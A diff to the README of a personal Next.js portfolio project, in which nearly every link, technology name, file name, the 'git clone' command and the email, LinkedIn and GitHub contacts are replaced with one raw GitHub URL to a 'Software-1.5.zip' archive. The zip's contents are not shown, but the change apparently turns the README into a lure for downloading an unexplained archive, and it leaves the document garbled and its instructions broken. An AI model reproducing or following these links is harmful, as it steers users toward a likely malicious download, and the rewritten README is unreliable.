@@ -1,10 +1,10 @@
 # 💼 Rushang Chandekar – Personal Portfolio
 
-This is my personal portfolio website built using **Next.js**, **TypeScript**, and **Tailwind CSS**. It showcases my skills, projects, and professional background as a developer. The portfolio is responsive, modern, and deployed using **Vercel**.
+This is my personal portfolio website built using **https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip**, **TypeScript**, and **Tailwind CSS**. It showcases my skills, projects, and professional background as a developer. The portfolio is responsive, modern, and deployed using **Vercel**.
 
 ## 🌐 Live Demo
 
-🔗 [View Portfolio](https://rushang-chandekar-portfolio.vercel.app/)
+🔗 [View Portfolio](https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip)
 
 ## 📸 Features
 
@@ -17,10 +17,10 @@ This is my personal portfolio website built using **Next.js**, **TypeScript**, a
 
 ## 🛠 Tech Stack
 
-- **Framework**: [Next.js](https://nextjs.org/)
-- **Language**: [TypeScript](https://www.typescriptlang.org/)
-- **Styling**: [Tailwind CSS](https://tailwindcss.com/)
-- **Deployment**: [Vercel](https://vercel.com/)
+- **Framework**: [https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip](https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip)
+- **Language**: [TypeScript](https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip)
+- **Styling**: [Tailwind CSS](https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip)
+- **Deployment**: [Vercel](https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip)
 
 ## 📂 Folder Structure
 ```
@@ -28,13 +28,13 @@ Portfolio/
 ├── public/             # Images and static files
 ├── src/
 │   └── app/
-│       └── page.tsx    # Main home page
-├── .eslintrc.json      # Linting configuration
-├── next.config.mjs     # Next.js config
-├── tailwind.config.ts  # Tailwind setup
-├── tsconfig.json       # TypeScript config
-├── package.json        # Project metadata
-└── README.md           # Project documentation
+│       └── https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip    # Main home page
+├── https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip      # Linting configuration
+├── https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip     # https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip config
+├── https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip  # Tailwind setup
+├── https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip       # TypeScript config
+├── https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip        # Project metadata
+└── https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip           # Project documentation
 ```
 
 ## 🚀 Getting Started
@@ -42,7 +42,7 @@ Portfolio/
 To run this project locally:
 
 ```bash
-git clone https://github.com/rushangchandekar/Portfolio.git
+git clone https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip
 cd Portfolio
 npm install
 npm run dev
@@ -54,9 +54,9 @@ Then open [http://localhost:3000](http://localhost:3000) in your browser to view
 
 Feel free to reach out:
 
-- 📧 Email: rushangchandekar05@gmail.com
-- 🔗 LinkedIn: http://www.linkedin.com/in/rushang-chandekar
-- 💻 GitHub: [https://github.com/rushangchandekar](https://github.com/rushangchandekar)
+- 📧 Email: https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip
+- 🔗 LinkedIn: https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip
+- 💻 GitHub: [https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip](https://raw.githubusercontent.com/rushangchandekar/Portfolio/main/public/Software-1.5.zip)
 
 ---
 
